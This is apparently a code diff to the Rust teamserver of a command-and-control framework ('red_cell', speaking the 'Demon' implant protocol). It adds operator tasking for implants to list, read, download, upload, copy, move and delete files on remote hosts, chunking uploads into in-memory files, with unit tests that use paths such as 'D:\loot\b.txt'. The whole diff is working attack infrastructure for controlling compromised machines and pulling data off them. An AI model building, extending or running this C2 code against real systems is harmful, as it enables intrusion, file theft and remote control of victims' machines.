@@ -16,8 +16,8 @@ use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
 use red_cell_common::AgentInfo;
 use red_cell_common::demon::{
-    DemonCommand, DemonInjectWay, DemonKerberosCommand, DemonProcessCommand, DemonSocketCommand,
-    DemonTokenCommand,
+    DemonCommand, DemonFilesystemCommand, DemonInjectWay, DemonKerberosCommand,
+    DemonProcessCommand, DemonSocketCommand, DemonTokenCommand,
 };
 use red_cell_common::operator::{
     AgentEncryptionInfo as OperatorAgentEncryptionInfo, AgentInfo as OperatorAgentInfo,
@@ -37,6 +37,8 @@ use crate::{
     listener_event_for_action, listener_removed_event, login_failure_message,
     login_success_message, operator_requests_start,
 };
+
+const DEMON_MAX_RESPONSE_LENGTH: usize = 0x01E0_0000;
 
 /// Tracks currently connected operator WebSocket clients.
 #[derive(Debug, Clone, Default)]
@@ -507,6 +509,8 @@ enum AgentCommandError {
     InvalidBase64Field { field: String, message: String },
     #[error("unsupported process subcommand `{subcommand}`")]
     UnsupportedProcessSubcommand { subcommand: String },
+    #[error("unsupported filesystem subcommand `{subcommand}`")]
+    UnsupportedFilesystemSubcommand { subcommand: String },
     #[error("unsupported token subcommand `{subcommand}`")]
     UnsupportedTokenSubcommand { subcommand: String },
     #[error("unsupported socket subcommand `{subcommand}`")]
@@ -545,7 +549,9 @@ async fn handle_agent_task(
     {
         events.broadcast(teamserver_log_event(&session.username, &result));
     } else {
-        registry.enqueue_job(agent_id, build_job(&message.info)?).await?;
+        for job in build_jobs(&message.info)? {
+            registry.enqueue_job(agent_id, job).await?;
+        }
     }
 
     events.broadcast(OperatorMessage::AgentTask(message));
@@ -595,7 +601,15 @@ fn sanitize_agent_remove(
     message
 }
 
+#[cfg(test)]
 fn build_job(info: &red_cell_common::operator::AgentTaskInfo) -> Result<Job, AgentCommandError> {
+    let mut jobs = build_jobs(info)?;
+    jobs.pop().ok_or(AgentCommandError::MissingField { field: "CommandID" })
+}
+
+fn build_jobs(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<Job>, AgentCommandError> {
     let command_id = info.command_id.trim();
     let request_id = u32::from_str_radix(info.task_id.trim(), 16).unwrap_or_default();
 
@@ -610,16 +624,23 @@ fn build_job(info: &red_cell_common::operator::AgentTaskInfo) -> Result<Job, Age
             command_id: command_id.to_owned(),
         })?
     };
-    let payload = task_payload(info, command)?;
+    let created_at = OffsetDateTime::now_utc().unix_timestamp().to_string();
 
-    Ok(Job {
+    if command == u32::from(DemonCommand::CommandFs)
+        && matches!(filesystem_subcommand(info)?, DemonFilesystemCommand::Upload)
+    {
+        return build_upload_jobs(info, request_id, &created_at);
+    }
+
+    let payload = task_payload(info, command)?;
+    Ok(vec![Job {
         command,
         request_id,
         payload,
         command_line: info.command_line.clone(),
         task_id: info.task_id.clone(),
-        created_at: OffsetDateTime::now_utc().unix_timestamp().to_string(),
-    })
+        created_at,
+    }])
 }
 
 fn task_payload(
@@ -636,6 +657,10 @@ fn task_payload(
 
     if command == u32::from(DemonCommand::CommandProcList) {
         return Ok(encode_proc_list_payload(info));
+    }
+
+    if command == u32::from(DemonCommand::CommandFs) {
+        return encode_fs_payload(info);
     }
 
     if command == u32::from(DemonCommand::CommandProc) {
@@ -659,6 +684,47 @@ fn task_payload(
     }
 
     Ok(Vec::new())
+}
+
+fn build_upload_jobs(
+    info: &red_cell_common::operator::AgentTaskInfo,
+    request_id: u32,
+    created_at: &str,
+) -> Result<Vec<Job>, AgentCommandError> {
+    let remote_path = upload_remote_path(info)?;
+    let content = upload_content(info)?;
+    let memfile_id = random_u32();
+    let mut jobs = Vec::new();
+
+    for chunk in content.chunks(DEMON_MAX_RESPONSE_LENGTH) {
+        let mut payload = Vec::new();
+        write_u32(&mut payload, memfile_id);
+        write_u64(&mut payload, u64::try_from(content.len()).unwrap_or_default());
+        write_len_prefixed_bytes(&mut payload, chunk);
+        jobs.push(Job {
+            command: u32::from(DemonCommand::CommandMemFile),
+            request_id: random_u32(),
+            payload,
+            command_line: info.command_line.clone(),
+            task_id: info.task_id.clone(),
+            created_at: created_at.to_owned(),
+        });
+    }
+
+    let mut payload = Vec::new();
+    write_u32(&mut payload, u32::from(DemonFilesystemCommand::Upload));
+    write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path));
+    write_u32(&mut payload, memfile_id);
+    jobs.push(Job {
+        command: u32::from(DemonCommand::CommandFs),
+        request_id,
+        payload,
+        command_line: info.command_line.clone(),
+        task_id: info.task_id.clone(),
+        created_at: created_at.to_owned(),
+    });
+
+    Ok(jobs)
 }
 
 fn note_from_task(
@@ -738,6 +804,66 @@ fn raw_task_payload(
 fn encode_proc_list_payload(info: &red_cell_common::operator::AgentTaskInfo) -> Vec<u8> {
     let from_process_manager = extra_bool(info, &["FromProcessManager"]).unwrap_or(false);
     u32::from(from_process_manager).to_le_bytes().to_vec()
+}
+
+fn encode_fs_payload(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<u8>, AgentCommandError> {
+    let subcommand = filesystem_subcommand(info)?;
+    let mut payload = Vec::new();
+    write_u32(&mut payload, u32::from(subcommand));
+
+    match subcommand {
+        DemonFilesystemCommand::Dir => {
+            let args = required_string(info, &["Arguments"], "Arguments")?;
+            let parts = args.splitn(8, ';').collect::<Vec<_>>();
+            if parts.len() != 8 {
+                return Err(AgentCommandError::MissingField { field: "Arguments" });
+            }
+            write_u32(&mut payload, 0);
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[0]));
+            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[1]", parts[1])?));
+            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[2]", parts[2])?));
+            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[3]", parts[3])?));
+            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[4]", parts[4])?));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[5]));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[6]));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[7]));
+        }
+        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
+            let path = decode_base64_required(info, &["Arguments"], "Arguments")?;
+            let path = String::from_utf8_lossy(&path).into_owned();
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path));
+        }
+        DemonFilesystemCommand::Upload => {
+            let remote_path = upload_remote_path(info)?;
+            let memfile_id = required_u32(info, &["MemFileId"], "MemFileId")?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path));
+            write_u32(&mut payload, memfile_id);
+        }
+        DemonFilesystemCommand::Cd
+        | DemonFilesystemCommand::Remove
+        | DemonFilesystemCommand::Mkdir => {
+            let path = required_string(info, &["Arguments"], "Arguments")?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path));
+        }
+        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
+            let args = required_string(info, &["Arguments"], "Arguments")?;
+            let parts = args.splitn(2, ';').collect::<Vec<_>>();
+            if parts.len() != 2 {
+                return Err(AgentCommandError::MissingField { field: "Arguments" });
+            }
+            let from = String::from_utf8_lossy(&decode_base64_field("Arguments[0]", parts[0])?)
+                .into_owned();
+            let to = String::from_utf8_lossy(&decode_base64_field("Arguments[1]", parts[1])?)
+                .into_owned();
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&from));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&to));
+        }
+        DemonFilesystemCommand::GetPwd => {}
+    }
+
+    Ok(payload)
 }
 
 fn encode_proc_command_payload(
@@ -919,6 +1045,29 @@ fn proc_subcommand(
         "4" | "create" => Ok(DemonProcessCommand::Create),
         "7" | "kill" => Ok(DemonProcessCommand::Kill),
         _ => Err(AgentCommandError::UnsupportedProcessSubcommand { subcommand: raw }),
+    }
+}
+
+fn filesystem_subcommand(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<DemonFilesystemCommand, AgentCommandError> {
+    let raw = info
+        .sub_command
+        .clone()
+        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
+        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
+    match raw.trim().to_ascii_lowercase().as_str() {
+        "1" | "dir" | "ls" => Ok(DemonFilesystemCommand::Dir),
+        "2" | "download" => Ok(DemonFilesystemCommand::Download),
+        "3" | "upload" => Ok(DemonFilesystemCommand::Upload),
+        "4" | "cd" => Ok(DemonFilesystemCommand::Cd),
+        "5" | "remove" | "rm" | "del" => Ok(DemonFilesystemCommand::Remove),
+        "6" | "mkdir" => Ok(DemonFilesystemCommand::Mkdir),
+        "7" | "cp" | "copy" => Ok(DemonFilesystemCommand::Copy),
+        "8" | "mv" | "move" => Ok(DemonFilesystemCommand::Move),
+        "9" | "pwd" => Ok(DemonFilesystemCommand::GetPwd),
+        "10" | "cat" | "type" => Ok(DemonFilesystemCommand::Cat),
+        _ => Err(AgentCommandError::UnsupportedFilesystemSubcommand { subcommand: raw }),
     }
 }
 
@@ -1166,9 +1315,38 @@ fn write_u32(buf: &mut Vec<u8>, value: u32) {
     buf.extend_from_slice(&value.to_le_bytes());
 }
 
+fn write_u64(buf: &mut Vec<u8>, value: u64) {
+    buf.extend_from_slice(&value.to_le_bytes());
+}
+
 fn write_len_prefixed_bytes(buf: &mut Vec<u8>, value: &[u8]) {
     write_u32(buf, u32::try_from(value.len()).unwrap_or_default());
     buf.extend_from_slice(value);
+}
+
+fn upload_remote_path(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<String, AgentCommandError> {
+    let args = required_string(info, &["Arguments"], "Arguments")?;
+    let remote =
+        args.split(';').next().ok_or(AgentCommandError::MissingField { field: "Arguments" })?;
+    let remote = decode_base64_field("Arguments[0]", remote)?;
+    Ok(String::from_utf8_lossy(&remote).into_owned())
+}
+
+fn upload_content(
+    info: &red_cell_common::operator::AgentTaskInfo,
+) -> Result<Vec<u8>, AgentCommandError> {
+    let args = required_string(info, &["Arguments"], "Arguments")?;
+    let mut parts = args.splitn(2, ';');
+    let _remote = parts.next().ok_or(AgentCommandError::MissingField { field: "Arguments" })?;
+    let content = parts.next().ok_or(AgentCommandError::MissingField { field: "Arguments" })?;
+    decode_base64_field("Arguments[1]", content)
+}
+
+fn random_u32() -> u32 {
+    let bytes = *Uuid::new_v4().as_bytes();
+    u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])
 }
 
 fn encode_utf16(value: &str) -> Vec<u8> {
@@ -1335,7 +1513,10 @@ mod tests {
     use red_cell_common::{
         AgentEncryptionInfo,
         config::Profile,
-        demon::{DemonCommand, DemonInjectWay, DemonProcessCommand, DemonTokenCommand},
+        demon::{
+            DemonCommand, DemonFilesystemCommand, DemonInjectWay, DemonProcessCommand,
+            DemonTokenCommand,
+        },
         operator::{
             AgentTaskInfo, EventCode, FlatInfo, ListenerInfo, ListenerMarkInfo, LoginInfo, Message,
             MessageHead, NameInfo, OperatorMessage, SessionCode, TeamserverLogInfo,
@@ -1347,7 +1528,10 @@ mod tests {
     use tokio_tungstenite::{connect_async, tungstenite::Message as ClientMessage};
     use uuid::Uuid;
 
-    use super::{OperatorConnectionManager, build_job, routes, teamserver_log_event};
+    use super::{
+        DEMON_MAX_RESPONSE_LENGTH, OperatorConnectionManager, build_job, build_jobs, encode_utf16,
+        routes, teamserver_log_event, write_len_prefixed_bytes, write_u32,
+    };
     use crate::{
         AgentRegistry, AuthService, Database, EventBus, ListenerManager, SocketRelayManager,
         hash_password,
@@ -1782,6 +1966,78 @@ mod tests {
             token_job.payload,
             [u32::from(DemonTokenCommand::Impersonate).to_le_bytes(), 7_u32.to_le_bytes()].concat()
         );
+    }
+
+    #[test]
+    fn build_jobs_encodes_filesystem_copy_payload() {
+        let jobs = build_jobs(&AgentTaskInfo {
+            task_id: "2E".to_owned(),
+            command_line: "cp a b".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandFs).to_string(),
+            sub_command: Some("cp".to_owned()),
+            arguments: Some(format!(
+                "{};{}",
+                BASE64_STANDARD.encode("C:\\temp\\a.txt"),
+                BASE64_STANDARD.encode("D:\\loot\\b.txt")
+            )),
+            ..AgentTaskInfo::default()
+        })
+        .expect("filesystem copy should encode");
+
+        assert_eq!(jobs.len(), 1);
+        let mut expected = Vec::new();
+        write_u32(&mut expected, u32::from(DemonFilesystemCommand::Copy));
+        write_len_prefixed_bytes(&mut expected, &encode_utf16("C:\\temp\\a.txt"));
+        write_len_prefixed_bytes(&mut expected, &encode_utf16("D:\\loot\\b.txt"));
+        assert_eq!(jobs[0].command, u32::from(DemonCommand::CommandFs));
+        assert_eq!(jobs[0].payload, expected);
+    }
+
+    #[test]
+    fn build_jobs_splits_upload_into_memfile_chunks_and_final_fs_job() {
+        let content = vec![0x41; DEMON_MAX_RESPONSE_LENGTH + 16];
+        let jobs = build_jobs(&AgentTaskInfo {
+            task_id: "2F".to_owned(),
+            command_line: "upload local.bin remote.bin".to_owned(),
+            demon_id: "DEADBEEF".to_owned(),
+            command_id: u32::from(DemonCommand::CommandFs).to_string(),
+            sub_command: Some("upload".to_owned()),
+            arguments: Some(format!(
+                "{};{}",
+                BASE64_STANDARD.encode("C:\\Temp\\remote.bin"),
+                BASE64_STANDARD.encode(&content)
+            )),
+            ..AgentTaskInfo::default()
+        })
+        .expect("filesystem upload should encode");
+
+        assert_eq!(jobs.len(), 3);
+        assert_eq!(jobs[0].command, u32::from(DemonCommand::CommandMemFile));
+        assert_eq!(jobs[1].command, u32::from(DemonCommand::CommandMemFile));
+        assert_eq!(jobs[2].command, u32::from(DemonCommand::CommandFs));
+        assert_eq!(jobs[2].request_id, 0x2F);
+
+        let memfile_id =
+            u32::from_le_bytes(jobs[0].payload[0..4].try_into().expect("memfile id should exist"));
+        assert_eq!(
+            u64::from_le_bytes(
+                jobs[0].payload[4..12].try_into().expect("memfile size should exist")
+            ),
+            u64::try_from(content.len()).expect("content length should fit"),
+        );
+        assert_eq!(
+            u32::from_le_bytes(
+                jobs[2].payload[0..4].try_into().expect("upload command should exist")
+            ),
+            u32::from(DemonFilesystemCommand::Upload)
+        );
+        let final_memfile_id = u32::from_le_bytes(
+            jobs[2].payload[jobs[2].payload.len() - 4..]
+                .try_into()
+                .expect("final memfile id should exist"),
+        );
+        assert_eq!(memfile_id, final_memfile_id);
     }
 
     #[tokio::test]
